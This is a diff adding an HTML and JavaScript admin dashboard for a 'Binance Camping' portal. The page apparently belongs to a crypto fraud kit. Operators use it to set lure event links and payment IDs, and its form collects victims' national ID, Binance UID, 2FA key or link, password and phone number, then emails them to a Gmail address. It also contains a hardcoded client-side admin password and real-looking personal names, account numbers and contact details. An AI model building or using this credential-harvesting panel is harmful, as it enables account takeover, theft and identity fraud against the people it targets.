@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Dashboard - Binance Camping</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+  <style>
+    :root {
+      --primary: #F3BA2F;
+      --bg: #0b0e11;
+      --card-bg: rgba(24, 26, 32, 0.95);
+      --input-bg: rgba(14, 16, 20, 0.85);
+      --border: rgba(255, 255, 255, 0.1);
+      --text: #eaecef;
+      --text-muted: #848e9c;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
+
+    body {
+      background-color: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 24px 14px;
+    }
+
+    .admin-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 28px;
+      width: 100%;
+      max-width: 520px;
+      padding: 28px 24px;
+      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.85);
+    }
+
+    #loginBox { text-align: center; }
+    .login-icon {
+      width: 64px; height: 64px; border-radius: 50%; background: rgba(243, 186, 47, 0.15);
+      color: var(--primary); display: inline-flex; align-items: center; justify-content: center;
+      font-size: 1.6rem; margin-bottom: 16px; border: 1px solid rgba(243, 186, 47, 0.3);
+    }
+
+    .admin-nav {
+      display: flex; background: var(--input-bg); padding: 5px; border-radius: 14px;
+      border: 1px solid var(--border); margin-bottom: 22px; gap: 5px;
+    }
+
+    .nav-btn {
+      flex: 1; background: transparent; border: none; color: var(--text-muted);
+      padding: 10px; border-radius: 10px; font-size: 0.86rem; font-weight: 700;
+      cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 7px;
+    }
+    .nav-btn.active { background: var(--primary); color: #0b0e11; }
+
+    .top-bar {
+      display: flex; justify-content: space-between; align-items: center;
+      margin-bottom: 18px; padding-bottom: 12px; border-bottom: 1px solid var(--border);
+    }
+    .top-bar h2 { font-size: 1.25rem; color: #fff; font-weight: 800; display: flex; align-items: center; gap: 8px; }
+    .btn-logout { background: transparent; border: none; color: #ef4444; font-size: 0.85rem; font-weight: 700; cursor: pointer; }
+
+    .form-group { margin-bottom: 14px; }
+    .form-group label { display: block; font-size: 0.8rem; font-weight: 600; color: var(--text-muted); margin-bottom: 6px; }
+    .form-group label .req { color: #ef4444; }
+
+    .form-control {
+      width: 100%; background: var(--input-bg); border: 1px solid var(--border); border-radius: 10px;
+      padding: 11px 13px; color: #fff; font-size: 0.88rem; outline: none;
+    }
+    .form-control:focus { border-color: var(--primary); }
+
+    /* Multiple Links Input Field */
+    .link-row {
+      display: flex; gap: 8px; margin-bottom: 8px;
+    }
+    .btn-remove-link {
+      background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3);
+      color: #ef4444; border-radius: 10px; padding: 0 14px; cursor: pointer; font-size: 0.9rem;
+    }
+    .btn-add-link {
+      background: rgba(243, 186, 47, 0.1); border: 1px dashed var(--primary);
+      color: var(--primary); width: 100%; padding: 9px; border-radius: 10px;
+      font-weight: 700; font-size: 0.82rem; cursor: pointer; margin-top: 4px;
+    }
+    .btn-add-link:hover { background: rgba(243, 186, 47, 0.2); }
+
+    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+
+    .priority-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; }
+    .priority-btn {
+      background: var(--input-bg); border: 1px solid var(--border); color: var(--text-muted);
+      padding: 9px 4px; border-radius: 10px; font-size: 0.78rem; font-weight: 700; cursor: pointer; text-align: center;
+    }
+    .priority-btn.active { background: rgba(243, 186, 47, 0.15); border-color: var(--primary); color: var(--primary); }
+    .priority-btn.active.selected-opt { background: rgba(16, 185, 129, 0.15); border-color: #10b981; color: #10b981; }
+    .priority-btn.active.rejected-opt { background: rgba(239, 68, 68, 0.15); border-color: #ef4444; color: #ef4444; }
+
+    .btn-action {
+      width: 100%; background: linear-gradient(135deg, #F3BA2F 0%, #e0a722 100%);
+      color: #0b0e11; border: none; padding: 13px; border-radius: 12px; font-size: 0.95rem;
+      font-weight: 800; cursor: pointer; margin-top: 14px; display: flex; align-items: center; justify-content: center; gap: 8px;
+    }
+    .btn-portal-link { display: block; text-align: center; color: var(--text-muted); text-decoration: none; font-size: 0.85rem; margin-top: 16px; font-weight: 600; }
+    .btn-portal-link:hover { color: #fff; }
+
+    .toast {
+      position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-60px);
+      background: #181a20; color: #fff; border: 1px solid var(--border); padding: 10px 20px;
+      border-radius: 9999px; font-size: 0.82rem; font-weight: 600; opacity: 0; transition: all 0.25s ease; z-index: 10000;
+    }
+    .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+  </style>
+</head>
+<body>
+
+  <div id="toast" class="toast">
+    <i class="fa-solid fa-circle-check" style="color: #10b981;"></i>
+    <span id="toastMsg">Action Successful!</span>
+  </div>
+
+  <!-- ১। লগইন বক্স -->
+  <div class="admin-card" id="loginBox">
+    <div class="login-icon"><i class="fa-solid fa-shield-halved"></i></div>
+    <h2 style="font-size: 1.4rem; color: #fff; font-weight: 800; margin-bottom: 6px;">Admin Access</h2>
+    <p style="color: var(--text-muted); font-size: 0.85rem; margin-bottom: 22px;">ড্যাশবোর্ডে প্রবেশের জন্য পাসওয়ার্ড দিন</p>
+    <div class="form-group">
+      <input type="password" id="adminPassInput" class="form-control" placeholder="Enter Admin Password">
+    </div>
+    <button class="btn-action" onclick="checkLogin()"><i class="fa-solid fa-arrow-right-to-bracket"></i> Login Dashboard</button>
+    <a href="index.html" class="btn-portal-link">← Return to User Portal</a>
+  </div>
+
+  <!-- ২। মূল ড্যাশবোর্ড -->
+  <div class="admin-card" id="mainDashboard" style="display: none;">
+    <div class="top-bar">
+      <h2><i class="fa-solid fa-gauge-high" style="color: var(--primary);"></i> Admin Control</h2>
+      <button class="btn-logout" onclick="logout()"><i class="fa-solid fa-right-from-bracket"></i> Logout</button>
+    </div>
+
+    <div class="admin-nav">
+      <button class="nav-btn active" id="tabBtnSettings" onclick="switchTab('settings')"><i class="fa-solid fa-sliders"></i> User Page Settings</button>
+      <button class="nav-btn" id="tabBtnApply" onclick="switchTab('apply')"><i class="fa-solid fa-paper-plane"></i> Direct Apply</button>
+    </div>
+
+    <!-- ট্যাব ১: ইউজার পেজ সেটিংস -->
+    <div id="tabContentSettings">
+      <form onsubmit="savePortalSettings(event)">
+        
+        <div class="form-group">
+          <label>Event Links (Add single or multiple)</label>
+          <div id="adminLinksList">
+            <!-- ডায়নামিক লিংক রো রেন্ডার হবে -->
+          </div>
+          <button type="button" class="btn-add-link" onclick="addLinkInputRow('')"><i class="fa-solid fa-plus"></i> Add Another Event Link</button>
+        </div>
+
+        <div class="form-group">
+          <label>Portal Password</label>
+          <input type="text" id="cfgPassword" class="form-control" required>
+        </div>
+
+        <div class="grid-2">
+          <div class="form-group">
+            <label>Pay ID 1 - Username</label>
+            <input type="text" id="cfgUser1" class="form-control" required>
+          </div>
+          <div class="form-group">
+            <label>Pay ID 1 - Number</label>
+            <input type="text" id="cfgId1" class="form-control" required>
+          </div>
+        </div>
+
+        <div class="grid-2">
+          <div class="form-group">
+            <label>Pay ID 2 - Username</label>
+            <input type="text" id="cfgUser2" class="form-control" required>
+          </div>
+          <div class="form-group">
+            <label>Pay ID 2 - Number</label>
+            <input type="text" id="cfgId2" class="form-control" required>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <label>bKash Screenshot Image URL</label>
+          <input type="url" id="cfgBkashImg" class="form-control" required>
+        </div>
+
+        <button type="submit" class="btn-action"><i class="fa-solid fa-floppy-disk"></i> Save Portal Changes</button>
+        <a href="index.html" class="btn-portal-link" target="_blank">Open User Website ↗</a>
+      </form>
+    </div>
+
+    <!-- ট্যাব ২: ডাইরেক্ট এপ্লাই -->
+    <div id="tabContentApply" style="display: none;">
+      <form onsubmit="adminSubmitApplication(event)">
+        <div class="form-group">
+          <label>Name (NID) <span class="req">*</span></label>
+          <input type="text" id="admName" class="form-control" placeholder="Full name as per NID" required>
+        </div>
+        <div class="form-group">
+          <label>Mail <span class="req">*</span></label>
+          <input type="email" id="admMail" class="form-control" placeholder="Applicant Email Address" required>
+        </div>
+        <div class="form-group">
+          <label>NID Number</label>
+          <input type="text" id="admNid" class="form-control" placeholder="Enter NID number (Optional)">
+        </div>
+        <div class="form-group">
+          <label>Binance ID <span class="req">*</span></label>
+          <input type="text" id="admBinanceId" class="form-control" placeholder="Applicant Binance UID" required>
+        </div>
+        <div class="form-group">
+          <label>2FA Link <span class="req">*</span></label>
+          <input type="text" id="adm2fa" class="form-control" placeholder="Enter 2FA Key or Link" required>
+        </div>
+        <div class="form-group">
+          <label>Password</label>
+          <input type="text" id="admPass" class="form-control" readonly style="color: #848e9c; background: rgba(0,0,0,0.3);">
+        </div>
+        <div class="form-group">
+          <label>Contact Number <span class="req">*</span></label>
+          <input type="tel" id="admContact" class="form-control" placeholder="Phone number (Mandatory)" required>
+        </div>
+        <div class="form-group">
+          <label>Priority</label>
+          <div class="priority-grid">
+            <button type="button" class="priority-btn" onclick="selectAdminPriority('Selected', this)">Selected</button>
+            <button type="button" class="priority-btn" onclick="selectAdminPriority('90%', this)">90%</button>
+            <button type="button" class="priority-btn active" onclick="selectAdminPriority('80%', this)">80%</button>
+            <button type="button" class="priority-btn" onclick="selectAdminPriority('Rejected', this)">Rejected</button>
+          </div>
+          <input type="hidden" id="admPriority" value="80%">
+        </div>
+        <button type="submit" class="btn-action"><i class="fa-solid fa-paper-plane"></i> Submit & Generate Email</button>
+      </form>
+    </div>
+
+  </div>
+
+  <script>
+    const ADMIN_PASSWORD = "admin123";
+
+    const DEFAULT_CONFIG = {
+      eventLinks: [
+        "https://www.binance.com/en/activity/trading-competition/sep-global-referral?utm_source=Lite_Annoucement"
+      ],
+      password: "Sayem#07",
+      user1: "Al_Rifat",
+      id1: "1260122411",
+      user2: "Shanjida_Islam",
+      id2: "1260130161",
+      bkashImg: "https://i.postimg.cc/02xYHddv/Screenshot-20260920-235840.jpg"
+    };
+
+    function checkLogin() {
+      const pass = document.getElementById("adminPassInput").value;
+      if (pass === ADMIN_PASSWORD) {
+        document.getElementById("loginBox").style.display = "none";
+        document.getElementById("mainDashboard").style.display = "block";
+        loadCurrentValues();
+        showToast("Logged in successfully!");
+      } else {
+        alert("ভুল পাসওয়ার্ড!");
+      }
+    }
+
+    function logout() {
+      document.getElementById("mainDashboard").style.display = "none";
+      document.getElementById("loginBox").style.display = "block";
+      document.getElementById("adminPassInput").value = "";
+    }
+
+    function switchTab(tab) {
+      const btnSettings = document.getElementById("tabBtnSettings");
+      const btnApply = document.getElementById("tabBtnApply");
+      const contentSettings = document.getElementById("tabContentSettings");
+      const contentApply = document.getElementById("tabContentApply");
+
+      if (tab === 'settings') {
+        btnSettings.classList.add("active");
+        btnApply.classList.remove("active");
+        contentSettings.style.display = "block";
+        contentApply.style.display = "none";
+      } else {
+        btnApply.classList.add("active");
+        btnSettings.classList.remove("active");
+        contentSettings.style.display = "none";
+        contentApply.style.display = "block";
+      }
+    }
+
+    // এডমিন পেজে নতুন লিংক ফিল্ড রো যোগ করা
+    function addLinkInputRow(value = "") {
+      const list = document.getElementById("adminLinksList");
+      const div = document.createElement("div");
+      div.className = "link-row";
+      div.innerHTML = `
+        <input type="url" class="form-control admin-link-input" value="${value}" placeholder="https://..." required>
+        <button type="button" class="btn-remove-link" onclick="removeLinkInputRow(this)"><i class="fa-solid fa-trash-can"></i></button>
+      `;
+      list.appendChild(div);
+    }
+
+    function removeLinkInputRow(btn) {
+      const list = document.getElementById("adminLinksList");
+      if (list.children.length > 1) {
+        btn.parentElement.remove();
+      } else {
+        alert("কমপক্ষে একটি ইভেন্ট লিংক রাখতে হবে!");
+      }
+    }
+
+    function loadCurrentValues() {
+      const data = JSON.parse(localStorage.getItem("portalConfig")) || DEFAULT_CONFIG;
+      
+      const list = document.getElementById("adminLinksList");
+      list.innerHTML = "";
+      const links = data.eventLinks || (data.eventLink ? [data.eventLink] : DEFAULT_CONFIG.eventLinks);
+      links.forEach(link => addLinkInputRow(link));
+
+      document.getElementById("cfgPassword").value = data.password;
+      document.getElementById("cfgUser1").value = data.user1;
+      document.getElementById("cfgId1").value = data.id1;
+      document.getElementById("cfgUser2").value = data.user2;
+      document.getElementById("cfgId2").value = data.id2;
+      document.getElementById("cfgBkashImg").value = data.bkashImg;
+      document.getElementById("admPass").value = data.password;
+    }
+
+    function savePortalSettings(e) {
+      e.preventDefault();
+
+      // সব লিংক কালেক্ট করা
+      const linkInputs = document.querySelectorAll(".admin-link-input");
+      const collectedLinks = [];
+      linkInputs.forEach(input => {
+        const val = input.value.trim();
+        if (val) collectedLinks.push(val);
+      });
+
+      const updatedData = {
+        eventLinks: collectedLinks,
+        password: document.getElementById("cfgPassword").value.trim(),
+        user1: document.getElementById("cfgUser1").value.trim(),
+        id1: document.getElementById("cfgId1").value.trim(),
+        user2: document.getElementById("cfgUser2").value.trim(),
+        id2: document.getElementById("cfgId2").value.trim(),
+        bkashImg: document.getElementById("cfgBkashImg").value.trim()
+      };
+
+      localStorage.setItem("portalConfig", JSON.stringify(updatedData));
+      document.getElementById("admPass").value = updatedData.password;
+      showToast("Settings Updated Successfully!");
+    }
+
+    function selectAdminPriority(val, btn) {
+      document.getElementById("admPriority").value = val;
+      const btns = document.querySelectorAll(".priority-btn");
+      btns.forEach(b => b.classList.remove("active", "selected-opt", "rejected-opt"));
+      btn.classList.add("active");
+      if (val === "Selected") btn.classList.add("selected-opt");
+      if (val === "Rejected") btn.classList.add("rejected-opt");
+    }
+
+    function adminSubmitApplication(e) {
+      e.preventDefault();
+      const name = document.getElementById("admName").value.trim();
+      const mail = document.getElementById("admMail").value.trim();
+      const nid = document.getElementById("admNid").value.trim() || "N/A";
+      const binanceId = document.getElementById("admBinanceId").value.trim();
+      const twoFa = document.getElementById("adm2fa").value.trim();
+      const pass = document.getElementById("admPass").value;
+      const contact = document.getElementById("admContact").value.trim();
+      const priority = document.getElementById("admPriority").value;
+
+      const bodyText = 
+`Binance Camping Application Details:
+----------------------------------------
+Name (NID)     : ${name}
+Mail           : ${mail}
+NID Number     : ${nid}
+Binance ID     : ${binanceId}
+2FA Link       : ${twoFa}
+Password       : ${pass}
+Contact Number : ${contact}
+Priority       : ${priority}
+----------------------------------------
+Submitted via Admin Application Portal`;
+
+      const recipient = "mr.angry.sojib@gmail.com";
+      const subject = encodeURIComponent(`Binance Camping Application (Admin) - ${name}`);
+      const body = encodeURIComponent(bodyText);
+      window.location.href = `mailto:${recipient}?subject=${subject}&body=${body}`;
+    }
+
+    function showToast(msg) {
+      const toast = document.getElementById("toast");
+      document.getElementById("toastMsg").innerText = msg;
+      toast.classList.add("show");
+      setTimeout(() => toast.classList.remove("show"), 2300);
+    }
+  </script>
+
+</body>
+</html>
